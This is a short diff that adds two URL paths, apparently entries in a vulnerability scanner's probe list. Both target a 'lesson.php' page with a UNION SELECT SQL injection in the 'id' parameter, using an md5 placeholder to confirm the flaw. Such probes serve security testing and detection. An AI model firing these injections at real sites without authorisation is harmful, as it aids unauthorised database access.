@@ -1,0 +1,2 @@
+/caiwl/lesson.php?id=-1%20UNION%20SELECT%201,2,md5({{num}}),4,5
+/lesson.php?id=-1%20UNION%20SELECT%201,2,md5({{num}}),4,5
